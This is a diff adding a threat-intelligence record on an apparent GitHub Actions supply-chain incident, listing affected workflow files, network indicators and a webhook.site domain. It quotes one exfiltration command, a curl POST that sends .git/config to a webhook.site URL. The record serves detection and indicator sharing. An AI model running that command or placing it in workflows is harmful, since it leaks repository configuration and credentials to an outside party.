@@ -1,0 +1,33 @@
+description: Attackers exploited vulnerabilities in GitHub Actions workflows to exfiltrate
+  data through webhook.site links.
+TTPs:
+  processes:
+  - node
+  commandline:
+  - 'curl X POST https://webhook.site/dazedab-5257-460a-blich-codle12ecact H "Content-Type:
+    text/plain" --data-binary @.git/config'
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - node -> webhook.site
+  - curl -> webhook.site
+  file_activity:
+  - .github/workflows/auto-assign-reviewers.yml
+  - .github/workflows/auto-changeset.yml
+  - .github/workflows/changeset-utils/index.js
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - webhook.site
+  urls:
+  - https://webhook.site/dazedab-5257-460a-blich-codle12ecact
+author:
+- Ilyas Makari
+reference: https://www.aikido.dev/blog/github-actions-incident-shai-hulud-supply-chain-attack
+date_of_publication: December 15, 2025
+file_creation_date: February 10, 2026
